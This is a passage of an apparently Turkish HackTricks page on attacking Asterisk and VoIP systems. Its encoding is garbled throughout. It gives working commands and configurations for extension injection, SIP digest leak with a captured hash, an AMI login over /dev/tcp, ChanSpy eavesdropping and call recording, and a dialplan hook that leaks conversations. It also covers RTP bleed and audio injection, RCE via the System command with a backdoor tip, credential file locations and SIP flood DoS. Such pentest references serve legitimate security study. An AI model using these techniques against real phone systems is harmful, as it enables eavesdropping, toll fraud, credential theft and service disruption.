exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Ã–nceki Ã¶rnekte kullanÄ±cÄ±dan bir bÃ¶lÃ¼mÃ¼ aramak iÃ§in **1'i tuÅŸlamasÄ±**, baÅŸka bir bÃ¶lÃ¼mÃ¼ aramak iÃ§in **2'yi tuÅŸlamasÄ±** veya bildiÄŸi takdirde **tam numarayÄ± girmesi** istenir.\
Zafiyet, belirtilen **uzantÄ± uzunluÄŸunun kontrol edilmemesidir, bu nedenle bir kullanÄ±cÄ± 5 saniyelik zaman aÅŸÄ±mÄ± sÃ¼resince tam bir numara girebilir ve arama yapÄ±lacaktÄ±r.**

### UzantÄ± Enjeksiyonu

Bir uzantÄ± kullanarak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**'in Ã§aÄŸrÄ±lacak olan **dahili numara** olduÄŸu yerde, **ext 101 tanÄ±tÄ±ldÄ±ÄŸÄ±nda** ÅŸu olacaklar:
```scss
exten => 101,1,Dial(SIP/101)
```
Ancak, eÄŸer **`${EXTEN}`** daha Ã¶nceki Asterisk sÃ¼rÃ¼mlerinde olduÄŸu gibi **sadece sayÄ±lardan fazlasÄ±na izin veriyorsa**, bir saldÄ±rgan **`101&SIP123123123`** gibi bir deÄŸer girebilir ve telefon numarasÄ± 123123123'Ã¼ arayabilir. Ve bu da sonuÃ§ olacaktÄ±r:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Bu nedenle, **`101`** uzantÄ±sÄ±na yapÄ±lan bir arama ve **`123123123`** numarasÄ±na gÃ¶nderilecek ve aramayÄ± ilk alanÄ±n yalnÄ±zca kurulacaÄŸÄ±... ancak bir saldÄ±rgan, gerÃ§ekleÅŸtirilen herhangi bir eÅŸleÅŸmeyi atlayan bir **uzantÄ± kullanÄ±rsa** ve mevcut olmasa da, yalnÄ±zca istenilen numaraya **arama enjekte edebilir**.

## SIPDigestLeak zafiyeti

SIP Digest Leak, donanÄ±m ve yazÄ±lÄ±m IP TelefonlarÄ± ile telefon adaptÃ¶rlerini (VoIP'ten analog'a) de iÃ§eren birÃ§ok SIP Telefonu etkileyen bir zafiyettir. Bu zafiyet, **Åifreleme kimlik doÄŸrulama yanÄ±tÄ±nÄ±n sÄ±zmasÄ±na** izin verir, bu yanÄ±t ÅŸifreden hesaplanÄ±r. ArdÄ±ndan **Ã§evrimdÄ±ÅŸÄ± bir ÅŸifre saldÄ±rÄ±sÄ± mÃ¼mkÃ¼n olur** ve meydan okuma yanÄ±tÄ±na dayanarak Ã§oÄŸu ÅŸifreyi kurtarabilir.

**[Buradan zafiyet senaryosu**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Bir IP Telefonu (kurban), herhangi bir baÄŸlantÄ± noktasÄ±nda dinleme yapar (Ã¶rneÄŸin: 5060), telefon aramalarÄ±nÄ± kabul eder
2. SaldÄ±rgan, IP Telefonuna bir INVITE gÃ¶nderir
3. Kurban telefon Ã§almaya baÅŸlar ve biri telefonu aÃ§ar ve kapatÄ±r (Ã§Ã¼nkÃ¼ karÅŸÄ± tarafta kimse telefonu aÃ§maz)
4. Telefon kapatÄ±ldÄ±ÄŸÄ±nda, **kurban telefon bir BYE gÃ¶nderir**
5. **SaldÄ±rgan bir 407 yanÄ±tÄ± verir** ve **kimlik doÄŸrulamasÄ± isteyerek** bir kimlik doÄŸrulama meydan okumasÄ± yapar
6. **Kurban telefon, ikinci bir BYE ile kimlik doÄŸrulama meydan okumasÄ±na yanÄ±t verir**
7. **SaldÄ±rgan ardÄ±ndan yerel makinesinde (veya daÄŸÄ±tÄ±lmÄ±ÅŸ aÄŸ vb.) meydan okuma yanÄ±tÄ±na karÅŸÄ± brute-force saldÄ±rÄ±sÄ± baÅŸlatabilir ve ÅŸifreyi tahmin edebilir**

* [**sippts**](https://github.com/Pepelux/sippts)**'den SIPPTS sÄ±zÄ±ntÄ±sÄ±**:** SIPPTS sÄ±zÄ±ntÄ±sÄ±, birÃ§ok SIP Telefonunu etkileyen SIP Digest Leak zafiyetini sÃ¶mÃ¼rÃ¼r. Ã‡Ä±ktÄ±, SIPPTS dcrack veya SipCrack aracÄ±nÄ± kullanarak brute-force saldÄ±rÄ±sÄ± yapmak iÃ§in SipCrack formatÄ±nda kaydedilebilir.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call, bir web kullanÄ±cÄ±sÄ±nÄ±n (Ã¶rneÄŸin bir Ã¼rÃ¼ne ilgi duyan) aranmak iÃ§in **telefon numarasÄ±nÄ± tanÄ±tmasÄ±na** olanak tanÄ±r. Daha sonra bir reklam aranacak ve kullanÄ±cÄ± telefonu **aÃ§tÄ±ÄŸÄ±nda** kullanÄ±cÄ± **arama yapÄ±lacak ve ajanla baÄŸlantÄ± kurulacak**.

Bunun iÃ§in yaygÄ±n bir Asterisk profili:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Ã–nceki profil, **BÄ°R IP adresinin baÄŸlanmasÄ±na izin veriyor** (ÅŸifre biliniyorsa).
* Daha Ã¶nce belirtildiÄŸi gibi **bir arama dÃ¼zenlemek** iÃ§in **okuma izinlerine gerek yoktur** ve sadece **yazma** izni olan **originate** gereklidir.

Bu izinlerle, ÅŸifreyi bilen herhangi bir IP adresi baÄŸlanabilir ve Ã§ok fazla bilgi Ã§Ä±karabilir, Ã¶rneÄŸin:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Daha fazla bilgi veya eylem istenebilir.**

### **Kulak Misafiri Olma**

Asterisk'te, **`ChanSpy`** komutunu kullanarak **izlenecek uzantÄ±(lar)**Ä± belirterek (veya hepsini) gerÃ§ekleÅŸen konuÅŸmalarÄ± dinlemek mÃ¼mkÃ¼ndÃ¼r. Bu komut bir uzantÄ±ya atanmalÄ±dÄ±r.

Ã–rneÄŸin, **`exten => 333,1,ChanSpy('all',qb)`** komutu, eÄŸer **333 numaralÄ± uzantÄ±yÄ± ararsanÄ±z**, **tÃ¼m** uzantÄ±larÄ± **izleyeceÄŸini**, yeni bir konuÅŸma baÅŸladÄ±ÄŸÄ±nda (**`b`**) sessiz modda (**`q`**) dinlemeye baÅŸlayacaÄŸÄ±nÄ± belirtir Ã§Ã¼nkÃ¼ etkileÅŸime girmek istemeyiz. Bir konuÅŸmadan diÄŸerine geÃ§mek iÃ§in **`*`** tuÅŸuna basabilir veya uzantÄ± numarasÄ±nÄ± iÅŸaretleyebilirsiniz.

AyrÄ±ca, yalnÄ±zca bir uzantÄ±yÄ± izlemek iÃ§in **`ExtenSpy`** kullanmak da mÃ¼mkÃ¼ndÃ¼r.

KonuÅŸmalarÄ± dinlemek yerine, bunlarÄ± dosyalara kaydetmek iÃ§in aÅŸaÄŸÄ±daki gibi bir uzantÄ± kullanmak da mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Aramalar **`/tmp`** dizininde kaydedilecektir.

AyrÄ±ca Asterisk'in kapanÄ±rken aramayÄ± sÄ±zdÄ±racak bir betik Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± bile yapabilirsiniz.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed gÃ¼venlik aÃ§Ä±ÄŸÄ±

**RTCPBleed**, 2017 yÄ±lÄ±nda yayÄ±nlanan Asterisk tabanlÄ± VoIP sunucularÄ±nÄ± etkileyen ciddi bir gÃ¼venlik sorunudur. Bu zafiyet, VoIP konuÅŸmalarÄ±nÄ± taÅŸÄ±yan **RTP (GerÃ§ek ZamanlÄ± Protokol) trafiÄŸinin**, **Ä°nternet'teki herhangi bir kiÅŸi tarafÄ±ndan yakalanÄ±p yÃ¶nlendirilmesine izin verir**. Bu durum, RTP trafiÄŸinin NAT (AÄŸ Adresi Ã‡evirisi) gÃ¼venlik duvarlarÄ±ndan geÃ§erken kimlik doÄŸrulamasÄ±nÄ± atlamasÄ±ndan kaynaklanmaktadÄ±r.

RTP vekilleri, iki veya daha fazla taraf arasÄ±nda RTP akÄ±ÅŸlarÄ±nÄ± vekilleÅŸtirerek RTC sistemlerini etkileyen **NAT kÄ±sÄ±tlamalarÄ±** ile baÅŸa Ã§Ä±kmaya Ã§alÄ±ÅŸÄ±r. NAT devrede olduÄŸunda, RTP vekil yazÄ±lÄ±mÄ± genellikle sinyalizasyon aracÄ±lÄ±ÄŸÄ±yla alÄ±nan RTP IP ve port bilgilerine gÃ¼venemez. Bu nedenle, birÃ§ok RTP vekili, bu tÃ¼r **IP ve port Ã§iftinin otomatik olarak Ã¶ÄŸrenildiÄŸi bir mekanizma uygulamÄ±ÅŸtÄ±r**. Bu genellikle gelen RTP trafiÄŸini inceleyerek ve gelen RTP trafiÄŸi iÃ§in kaynak IP ve portu yanÄ±tlanmasÄ± gereken IP ve port olarak iÅŸaretleyerek yapÄ±lÄ±r. Bu mekanizma, genellikle "Ã¶ÄŸrenme modu" olarak adlandÄ±rÄ±labilir ve **herhangi bir kimlik doÄŸrulama tÃ¼rÃ¼nden yararlanmaz**. Bu nedenle **saldÄ±rganlar**, **RTP trafiÄŸini RTP vekiline gÃ¶nderebilir** ve meÅŸru kullanÄ±cÄ±lara gÃ¶nderilmesi gereken vekilleÅŸtirilmiÅŸ RTP trafiÄŸini alabilir. Bu zafiyete RTP Bleed adÄ± verilir Ã§Ã¼nkÃ¼ saldÄ±rganlara meÅŸru kullanÄ±cÄ±lara gÃ¶nderilmesi gereken RTP medya akÄ±ÅŸlarÄ±nÄ± alabilmelerine izin verir.

RTP vekillerinin ve RTP yÄ±ÄŸÄ±nlarÄ±nÄ±n ilginÃ§ bir davranÄ±ÅŸÄ± da bazen, **RTP Bleed'e duyarlÄ± olmasalar bile**, **herhangi bir kaynaktan gelen RTP paketlerini kabul edecek, iletecek ve/veya iÅŸleyeceklerdir**. Bu nedenle saldÄ±rganlar, meÅŸru olanÄ±n yerine kendi medyalarÄ±nÄ± enjekte etmelerine izin verebilecek RTP paketleri gÃ¶nderebilir. Bu saldÄ±rÄ±ya RTP enjeksiyonu adÄ± verilir Ã§Ã¼nkÃ¼ mevcut RTP akÄ±ÅŸlarÄ±na yasal olmayan RTP paketlerinin enjekte edilmesine izin verir. Bu zafiyet hem RTP vekillerinde hem de uÃ§ noktalarda bulunabilir.

Asterisk ve FreePBX geleneksel olarak **`NAT=yes` ayarÄ±nÄ±** kullanmÄ±ÅŸtÄ±r, bu da RTP trafiÄŸinin kimlik doÄŸrulamasÄ±nÄ± atlamasÄ±na olanak tanÄ±r ve bu da Ã§aÄŸrÄ±larda ses olmamasÄ±na veya tek yÃ¶nlÃ¼ ses olmasÄ±na neden olabilir.

Daha fazla bilgi iÃ§in [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* [**sippts**](https://github.com/Pepelux/sippts) 'den **`SIPPTS rtpbleed`**:** SIPPTS rtpbleed, RTP Bleed zafiyetini gÃ¶ndererek RTP akÄ±ÅŸlarÄ±nÄ± tespit eder.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed, RTP Bleed zafiyetini RTCP akÄ±ÅŸlarÄ± gÃ¶ndererek tespit eder.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood, RTP akÄ±ÅŸlarÄ± gÃ¶ndererek RTP SÄ±zÄ±ntÄ±sÄ± zafiyetini sÃ¶mÃ¼rÃ¼r.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject, RTP Bleed zafiyetini enjekte ederek bir ses dosyasÄ± (WAV formatÄ±nda) enjekte eder.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Asterisk'te, bir ÅŸekilde **dahili numara kurallarÄ± ekleyip yeniden yÃ¼klemeyi** baÅŸarÄ±rsanÄ±z (Ã¶rneÄŸin, zayÄ±f bir web yÃ¶netici sunucusunu ele geÃ§irerek), **`System`** komutunu kullanarak RCE elde etmek mÃ¼mkÃ¼ndÃ¼r.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`** komutu, gerektiÄŸinde sistem komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in **`System`** yerine kullanÄ±labilecek bir komuttur.

{% hint style="warning" %}
Sunucu, **`System`** komutunda belirli karakterlerin kullanÄ±mÄ±nÄ± engelliyorsa (Ã¶rneÄŸin Elastix'te), web sunucunun sistemin iÃ§inde dosya oluÅŸturmaya izin verip vermediÄŸini kontrol edin (Ã¶rneÄŸin Elastix veya trixbox'ta) ve bunu kullanarak bir arka kapÄ± betiÄŸi oluÅŸturun ve ardÄ±ndan o betiÄŸi Ã§alÄ±ÅŸtÄ±rmak iÃ§in **`System`** komutunu kullanÄ±n.
{% endhint %}

#### Ä°lginÃ§ yerel dosyalar ve izinler

* **`sip.conf`** -> SIP kullanÄ±cÄ±larÄ±nÄ±n ÅŸifresini iÃ§erir.
* **Asterisk sunucusu root olarak Ã§alÄ±ÅŸÄ±yorsa**, root hesabÄ±nÄ± tehlikeye atabilirsiniz.
* **mysql root kullanÄ±cÄ±sÄ±nÄ±n** muhtemelen **herhangi bir ÅŸifresi yoktur**.
* Bu, yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`FreePBX`**
* **`amportal.conf`** -> Web panel yÃ¶neticisinin ÅŸifresini iÃ§erir (FreePBX)
* **`FreePBX.conf`** -> VeritabanÄ±na eriÅŸmek iÃ§in kullanÄ±lan FreePBXuser kullanÄ±cÄ±sÄ±nÄ±n ÅŸifresini iÃ§erir
* Bu, yeni bir mysql kullanÄ±cÄ±sÄ± oluÅŸturmak iÃ§in kullanÄ±labilir.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root ÅŸifresi, IMAPd ÅŸifresi, web yÃ¶netici ÅŸifresi gibi birÃ§ok ÅŸifreyi dÃ¼z metin olarak iÃ§erir.
* **BirkaÃ§ klasÃ¶r**, tehlikeye atÄ±lan asterisk kullanÄ±cÄ±sÄ±na ait olacaktÄ±r (eÄŸer root olarak Ã§alÄ±ÅŸmÄ±yorsa). Bu kullanÄ±cÄ± Ã¶nceki dosyalarÄ± okuyabilir ve ayrÄ±ca yapÄ±landÄ±rmayÄ± kontrol eder, bu nedenle Asterisk'i baÅŸka arka kapÄ±lÄ± ikili dosyalarÄ± yÃ¼klemeye zorlayabilir.

### RTP Enjeksiyonu

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ve **`rtpmixsound`** (`sudo apt install rtpmixsound`) gibi araÃ§lar kullanÄ±larak konuÅŸmalara **`.wav`** eklemek mÃ¼mkÃ¼ndÃ¼r.

Ya da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) adresinden alÄ±nan betikler kullanÄ±larak konuÅŸmalarÄ± **taramak** iÃ§in (**`rtpscan.pl`**), bir `.wav` dosyasÄ±nÄ± bir konuÅŸmaya **gÃ¶ndermek** iÃ§in (**`rtpsend.pl`**) ve bir konuÅŸmaya **gÃ¼rÃ¼ltÃ¼ eklemek** iÃ§in (**`rtpflood.pl`**) kullanÄ±labilir.

### DoS

VoIP sunucularÄ±nda DoS elde etmek iÃ§in birkaÃ§ yol vardÄ±r.

* [**sippts**](https://github.com/Pepelux/sippts) tarafÄ±ndan **`SIPPTS flood`**: SIPPTS flood, hedefe sÄ±nÄ±rsÄ±z mesaj gÃ¶nderir.
* `sippts flood -i 10.10.0.10 -m invite -v`
* [**sippts**](https://github.com/Pepelux/sippts) tarafÄ±ndan **`SIPPTS ping`**: SIPPTS ping, sunucu yanÄ±t sÃ¼resini gÃ¶rmek iÃ§in bir SIP ping yapar.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk tarafÄ±ndan kullanÄ±lan IAX protokolÃ¼ne DoS saldÄ±rÄ±sÄ± yapar.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP Ã¼zerinden SIP/SDP INVITE mesajÄ± sÄ±zdÄ±rmak iÃ§in bir araÃ§.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): BirkaÃ§ iyi oluÅŸturulmuÅŸ RTP paketi gÃ¶nderir. KullanÄ±lan RTP baÄŸlantÄ± noktalarÄ±nÄ± bilmek gerekir (Ã¶nce izle).
* [**SIPp**](https://github.com/SIPp/sipp): SIP trafiÄŸini analiz etmeye ve oluÅŸturmaya izin verir, bu nedenle DoS iÃ§in de kullanÄ±labilir.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Ä°sviÃ§re Ã§akÄ±sÄ±. SIP saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in de kullanÄ±labilir.
* Fuzzerlar: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Ä°ÅŸletim Sistemi GÃ¼venlik AÃ§Ä±klarÄ±

Asterisk gibi bir yazÄ±lÄ±mÄ± yÃ¼klemenin en kolay yolu, zaten yÃ¼klÃ¼ olan bir **iÅŸletim sistemi daÄŸÄ±tÄ±mÄ±nÄ±** indirmektir, Ã¶rneÄŸin: **FreePBX, Elastix, Trixbox**... Bunlarla ilgili sorun, Ã§alÄ±ÅŸtÄ±ktan sonra sistem yÃ¶neticilerinin muhtemelen bunlarÄ± **tekrar gÃ¼ncellemeyeceÄŸi** ve zamanla **gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n keÅŸfedileceÄŸi** gerÃ§eÄŸidir.

## Referanslar

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sÄ±fÄ±rdan ileri seviyeye AWS hackleme becerilerini Ã¶ÄŸrenin</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) gÃ¶rÃ¼n
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>
